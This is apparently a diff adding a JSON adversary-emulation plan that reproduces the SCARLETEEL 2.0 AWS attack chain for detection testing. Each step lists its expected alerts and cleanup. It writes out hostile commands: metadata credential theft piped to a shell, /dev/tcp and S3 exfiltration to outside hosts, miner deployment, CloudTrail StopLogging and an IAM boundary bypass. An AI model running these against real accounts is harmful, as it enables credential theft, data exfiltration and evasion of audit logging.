@@ -1,0 +1,357 @@
+{
+  "techniques": [
+    {
+      "mitre_id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "aws",
+      "execution_plane": "data_plane",
+      "execution_context": "http_exploit",
+      "emulation_category": "emulated",
+      "description": "Exploit command injection vulnerability in Flask web application running inside a Docker container on port 8080. HTTP POST to /cmd endpoint with arbitrary shell commands.",
+      "api_calls": [],
+      "data_plane_actions": ["HTTP POST /cmd with cmd=<shell_command>"],
+      "host_commands": ["curl -s http://169.254.169.254/..."],
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["VPC Flow Logs", "EC2 console output", "Container logs"],
+      "expected_alert_findings": ["WAF alert on command injection pattern"],
+      "phase_in_chain": 1,
+      "dependencies": [],
+      "severity": "critical",
+      "resources_needed": {
+        "attack_surface": ["EC2 instance running vulnerable Flask app on port 8080 (0.0.0.0/0)"],
+        "target": ["Docker container with IMDSv1 reachable (hop_limit=2)"],
+        "bait": []
+      },
+      "cleanup_actions": ["Patch command injection vulnerability", "Enforce IMDSv2"],
+      "opsec_notes": "Container exploitation generates ZERO CloudTrail events."
+    },
+    {
+      "mitre_id": "T1552.005",
+      "name": "Cloud Instance Metadata API",
+      "tactic": "Credential Access",
+      "platform": "aws",
+      "execution_plane": "data_plane",
+      "execution_context": "imds_theft",
+      "emulation_category": "emulated",
+      "description": "Steal EC2 instance role temporary credentials from IMDSv1 endpoint from inside a Docker container. Follows the SCARLETEEL wget/sed/grep/configure pipeline pattern.",
+      "api_calls": [],
+      "data_plane_actions": [
+        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
+        "SCARLETEEL pipeline: curl | sed s/,/\\n/g | grep AccessKeyId | sed -> configure_stolen.sh | sh"
+      ],
+      "host_commands": [],
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["GuardDuty"],
+      "expected_alert_findings": [
+        "GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"
+      ],
+      "phase_in_chain": 1,
+      "dependencies": ["T1190"],
+      "severity": "critical",
+      "resources_needed": {
+        "attack_surface": ["EC2 instance with IMDSv1 enabled (HttpTokens=optional, HopLimit=2)"],
+        "target": ["IAM role with broad permissions attached to instance"],
+        "bait": []
+      },
+      "cleanup_actions": ["Enforce IMDSv2"],
+      "opsec_notes": "Invisible to CloudTrail. Real SCARLETEEL also exfiltrates via /dev/tcp built-in and Russian S3 endpoint to avoid CloudTrail in the victim account."
+    },
+    {
+      "mitre_id": "T1048",
+      "name": "Exfiltration Over Alternative Protocol",
+      "tactic": "Exfiltration",
+      "platform": "aws",
+      "execution_plane": "host_plane",
+      "execution_context": "simulated",
+      "emulation_category": "simulated",
+      "description": "SCARLETEEL 2.0 exfiltrates credentials via /dev/tcp shell built-in (bypasses firewall rules that block curl/wget) and via Russian S3-compatible endpoint (hb.bizmrg.com) which generates no CloudTrail events in the victim account.",
+      "api_calls": [],
+      "data_plane_actions": [
+        "exec 3<>/dev/tcp/175.102.182.6/80 (shell built-in exfil — simulated)",
+        "aws s3 cp credentials s3://attacker-bucket/ --endpoint-url https://hb.bizmrg.com (simulated)"
+      ],
+      "host_commands": [],
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["VPC Flow Logs", "DNS logs"],
+      "expected_alert_findings": [
+        "VPC Flow Logs: outbound connection to 175.102.182.6:80",
+        "DNS query for hb.bizmrg.com (Russian S3 endpoint)"
+      ],
+      "phase_in_chain": 1,
+      "dependencies": ["T1552.005"],
+      "severity": "high",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": [],
+        "bait": []
+      },
+      "cleanup_actions": [],
+      "opsec_notes": "SIMULATED ONLY — logged to /tmp/exfil_sim.log. Russian S3 endpoint technique generates ZERO CloudTrail events in the victim account — a key SCARLETEEL 2.0 innovation."
+    },
+    {
+      "mitre_id": "T1496",
+      "name": "Resource Hijacking",
+      "tactic": "Impact",
+      "platform": "aws",
+      "execution_plane": "host_plane",
+      "execution_context": "simulated",
+      "emulation_category": "simulated",
+      "description": "Deploy XMRig cryptominer + Pandora (Mirai variant DDoS bot) on compromised container host. Real SCARLETEEL 2.0 installed XMRig masquerading as 'containered' service and Pandora DDoS bot.",
+      "api_calls": [],
+      "data_plane_actions": ["HTTP POST /cmd to deploy miner simulation"],
+      "host_commands": [
+        "cat > /tmp/config_background.json (XMRig c3pool config with real wallet address)",
+        "cat > /tmp/miner.sh (Pandora + XMRig simulation script)",
+        "/tmp/miner.sh"
+      ],
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["GuardDuty", "Host-based EDR"],
+      "expected_alert_findings": [
+        "GuardDuty: CryptoCurrency:EC2/BitcoinTool.B!DNS"
+      ],
+      "phase_in_chain": 1,
+      "dependencies": ["T1190"],
+      "severity": "medium",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": [],
+        "bait": []
+      },
+      "cleanup_actions": ["Terminate the compromised instance"],
+      "opsec_notes": "SIMULATED ONLY. Real SCARLETEEL 2.0 used Monero wallet 43Lfq18Tyc... and pool.c3pool.com:13333."
+    },
+    {
+      "mitre_id": "T1526",
+      "name": "Cloud Service Discovery",
+      "tactic": "Discovery",
+      "platform": "aws",
+      "execution_plane": "control_plane",
+      "execution_context": "api_attack",
+      "emulation_category": "emulated",
+      "description": "Pacu-style IAM recon (ListUsers, ListRoles) followed by full S3 and Lambda enumeration using stolen instance role credentials. SCARLETEEL 2.0 used Pacu as its recon tool.",
+      "api_calls": [
+        "iam:ListUsers",
+        "iam:ListRoles",
+        "s3:ListBuckets",
+        "s3:ListObjectsV2",
+        "lambda:ListFunctions",
+        "lambda:GetFunction",
+        "lambda:ListVersionsByFunction",
+        "lambda:GetPolicy",
+        "lambda:ListAliases",
+        "lambda:ListTags",
+        "lambda:ListEventSourceMappings",
+        "cloudtrail:DescribeTrails",
+        "secretsmanager:ListSecrets"
+      ],
+      "data_plane_actions": [],
+      "host_commands": [],
+      "expected_audit_events": [
+        {"eventName": "ListUsers", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListRoles", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListBuckets", "eventSource": "s3.amazonaws.com"},
+        {"eventName": "ListFunctions", "eventSource": "lambda.amazonaws.com"},
+        {"eventName": "GetFunction", "eventSource": "lambda.amazonaws.com"},
+        {"eventName": "DescribeTrails", "eventSource": "cloudtrail.amazonaws.com"},
+        {"eventName": "ListSecrets", "eventSource": "secretsmanager.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM", "GuardDuty"],
+      "expected_alert_findings": [
+        "GuardDuty: Discovery:IAMUser/AnomalousBehavior",
+        "SIEM: 5+ Lambda read APIs within 30 seconds"
+      ],
+      "phase_in_chain": 2,
+      "dependencies": ["T1078.004"],
+      "severity": "high",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": ["IAM users/roles", "S3 buckets", "Lambda functions", "CloudTrail trails", "SecretsManager secrets"],
+        "bait": []
+      },
+      "cleanup_actions": [],
+      "opsec_notes": "ListUsers + ListRoles at the start distinguishes SCARLETEEL 2.0 (Pacu recon) from SCARLETEEL 1.0."
+    },
+    {
+      "mitre_id": "T1078.004",
+      "name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Defense Evasion / Privilege Escalation",
+      "platform": "aws",
+      "execution_plane": "control_plane",
+      "execution_context": "api_attack",
+      "emulation_category": "emulated",
+      "description": "Use stolen EC2 instance role temporary credentials from external IP. Also test AdminJoe naming-convention bypass: permission boundary denies iam:CreateAccessKey for 'admin*' (lowercase StringLike), but 'AdminJoe' (capital A) bypasses the condition.",
+      "api_calls": [
+        "iam:CreateUser",
+        "iam:DeleteUser",
+        "iam:CreateAccessKey"
+      ],
+      "data_plane_actions": [],
+      "host_commands": [],
+      "expected_audit_events": [
+        {"eventName": "CreateUser", "eventSource": "iam.amazonaws.com", "requestParameters": {"userName": "ScarleteelBackdoor"}},
+        {"eventName": "DeleteUser", "eventSource": "iam.amazonaws.com", "requestParameters": {"userName": "ScarleteelBackdoor"}},
+        {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com", "errorCode": "AccessDenied", "note": "adminJoe — blocked by boundary"},
+        {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com", "note": "AdminJoe — bypass attempt"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "GuardDuty"],
+      "expected_alert_findings": [
+        "CloudTrail: CreateUser from EC2 instance role",
+        "GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"
+      ],
+      "phase_in_chain": 2,
+      "dependencies": ["T1552.005"],
+      "severity": "critical",
+      "resources_needed": {
+        "attack_surface": ["Over-privileged EC2 role with iam:CreateUser permission"],
+        "target": [],
+        "bait": ["AdminJoe IAM user (created by permission boundary bypass logic)"]
+      },
+      "cleanup_actions": ["Remove iam:CreateUser from EC2 role", "Use StringEqualsIgnoreCase in policies"],
+      "opsec_notes": "The AdminJoe bypass is a real SCARLETEEL 2.0 technique. IAM StringLike 'admin*' is case-sensitive — capital A bypasses the deny."
+    },
+    {
+      "mitre_id": "T1098.001",
+      "name": "Account Manipulation: Additional Cloud Credentials",
+      "tactic": "Persistence",
+      "platform": "aws",
+      "execution_plane": "control_plane",
+      "execution_context": "api_attack",
+      "emulation_category": "emulated",
+      "description": "Attempt to create additional access keys on AdminJoe IAM user as a persistence mechanism. The naming-convention bypass (capital A) tests whether the IAM permission boundary's admin* StringLike deny condition applies.",
+      "api_calls": [
+        "iam:CreateAccessKey"
+      ],
+      "data_plane_actions": [],
+      "host_commands": [],
+      "expected_audit_events": [
+        {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com", "requestParameters": {"userName": "AdminJoe"}}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail"],
+      "expected_alert_findings": [
+        "CloudTrail: CreateAccessKey on existing user from EC2 instance role principal"
+      ],
+      "phase_in_chain": 2,
+      "dependencies": ["T1078.004"],
+      "severity": "high",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": ["AdminJoe IAM user"],
+        "bait": []
+      },
+      "cleanup_actions": ["Delete any created access keys via ListAccessKeys + DeleteAccessKey"],
+      "opsec_notes": "The bypass only works if AdminJoe user actually exists. If the user does not exist, CreateAccessKey returns NoSuchEntity (not AccessDenied), confirming the bypass logic works."
+    },
+    {
+      "mitre_id": "T1562.008",
+      "name": "Disable or Modify Cloud Logs",
+      "tactic": "Defense Evasion",
+      "platform": "aws",
+      "execution_plane": "control_plane",
+      "execution_context": "api_attack",
+      "emulation_category": "emulated",
+      "description": "Disable CloudTrail logging via cloudtrail:StopLogging after discovering the trail name via DescribeTrails. Executed within seconds of the previous phase — fully automated.",
+      "api_calls": [
+        "cloudtrail:DescribeTrails",
+        "cloudtrail:StopLogging"
+      ],
+      "data_plane_actions": [],
+      "host_commands": [],
+      "expected_audit_events": [
+        {"eventName": "DescribeTrails", "eventSource": "cloudtrail.amazonaws.com"},
+        {"eventName": "StopLogging", "eventSource": "cloudtrail.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "CloudWatch", "GuardDuty"],
+      "expected_alert_findings": [
+        "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled",
+        "CloudWatch alarm on StopLogging metric filter"
+      ],
+      "phase_in_chain": 4,
+      "dependencies": ["T1526"],
+      "severity": "critical",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": ["CloudTrail trail: scarleteel-trail-*"],
+        "bait": []
+      },
+      "cleanup_actions": ["cloudtrail:StartLogging", "SCP to prevent StopLogging from non-admin principals"],
+      "opsec_notes": "After StopLogging, subsequent API calls still appear in CloudTrail's 90-day internal event history (LookupEvents) but NOT in the S3 delivery bucket."
+    },
+    {
+      "mitre_id": "T1552.001",
+      "name": "Credentials In Files",
+      "tactic": "Credential Access",
+      "platform": "aws",
+      "execution_plane": "control_plane",
+      "execution_context": "api_attack",
+      "emulation_category": "emulated",
+      "description": "Extract IAM long-term access key credentials from terraform.tfstate file stored in S3 bucket. State file contains plaintext aws_iam_access_key resources for the bait IAM user.",
+      "api_calls": [
+        "s3:GetObject"
+      ],
+      "data_plane_actions": [],
+      "host_commands": [],
+      "expected_audit_events": [
+        {"eventName": "GetObject", "eventSource": "s3.amazonaws.com", "note": "Data event — invisible without S3 data event logging"}
+      ],
+      "audit_visible": false,
+      "detection_sources": ["CloudTrail S3 data events"],
+      "expected_alert_findings": [
+        "CRITICAL GAP: Data event only — invisible without explicit S3 data event logging"
+      ],
+      "phase_in_chain": 5,
+      "dependencies": ["T1526"],
+      "severity": "critical",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": [],
+        "bait": ["terraform.tfstate containing IAM access key for bait user in tf-state S3 bucket"]
+      },
+      "cleanup_actions": ["Delete access key", "Encrypt state", "Enable S3 data event logging"],
+      "opsec_notes": "This technique occurs AFTER CloudTrail StopLogging in Phase 4 — invisible both as a management event and because the trail is stopped."
+    },
+    {
+      "mitre_id": "T1528",
+      "name": "Steal Application Access Token",
+      "tactic": "Credential Access",
+      "platform": "aws",
+      "execution_plane": "control_plane",
+      "execution_context": "api_attack",
+      "emulation_category": "emulated",
+      "description": "Harvest AWS Secrets Manager secrets using stolen EC2 instance role credentials. The role has secretsmanager:ListSecrets and secretsmanager:GetSecretValue permissions.",
+      "api_calls": [
+        "secretsmanager:ListSecrets",
+        "secretsmanager:GetSecretValue"
+      ],
+      "data_plane_actions": [],
+      "host_commands": [],
+      "expected_audit_events": [
+        {"eventName": "ListSecrets", "eventSource": "secretsmanager.amazonaws.com"},
+        {"eventName": "GetSecretValue", "eventSource": "secretsmanager.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail"],
+      "expected_alert_findings": [
+        "SIEM: GetSecretValue from EC2 instance role from external IP"
+      ],
+      "phase_in_chain": 6,
+      "dependencies": ["T1078.004"],
+      "severity": "critical",
+      "resources_needed": {
+        "attack_surface": [],
+        "target": [],
+        "bait": ["Secrets Manager secret: prod/database/master_credentials with fake DB credentials"]
+      },
+      "cleanup_actions": ["Rotate the secret", "Restrict secretsmanager:GetSecretValue via resource conditions"],
+      "opsec_notes": "ListSecrets + GetSecretValue in the same second indicates automated tooling. SecretsManager harvest is a SCARLETEEL 2.0 addition not present in the original campaign."
+    }
+  ]
+}
